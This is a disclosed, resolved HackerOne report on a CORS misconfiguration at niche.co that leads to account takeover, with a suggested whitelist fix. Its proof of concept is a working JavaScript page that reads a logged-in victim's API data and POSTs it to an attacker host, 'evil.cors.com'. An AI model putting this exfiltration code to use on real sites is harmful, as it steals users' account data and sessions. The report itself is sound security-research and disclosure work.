---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '426147'
original_report_id: '426147'
title: CORS misconfig | Account Takeover
team_handle: x
created_at: '2018-10-20T11:17:55.552Z'
disclosed_at: '2018-12-10T18:28:33.696Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 24
asset_identifier: niche.co
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# CORS misconfig | Account Takeover

## Metadata

- HackerOne Report ID: 426147
- Weakness: 
- Program: x
- Disclosed At: 2018-12-10T18:28:33.696Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 
CORS misconfig is found on niche.co as Access-Control-Allow-Origin is dynamically fetched from client Origin header with **credential true** and **different methods are enabled** as well.

**Description:**
Basically, the application was only checking whether "//niche.co" was in the Origin header, that means i can give anything containing that. For ex : "https://niche.co.evil.net", "https://niche.com", i can even change the protocol like http, ftp, file etc. F363563: cors_1.png

## Steps To Reproduce:
Exploit:
Host this code on a domain(http://niche.co.evil.net) or any other that contains "//niche.co".
```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
As soon as victim visit this malicious page, his details will be fetched from his current session and sent to attacker's domain where it can be logged or saved. F363586: cors_3.png F363564: cors_2.png

## How to fix

Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Supporting Material/References:

https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://ejj.io/misconfigured-cors/

## Impact

Using this misconfig, attacker can do many actions depending on the functionality of application which in this case use **API** and do activities like:
1) Read, Update, Delete Users information(Email,Location,Bio etc)
2) Stealing Authenticity_token(CSRF) 
3) Delete social accounts on niche
4) **View private posts of social accounts**
5) Close account
6) Logout etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
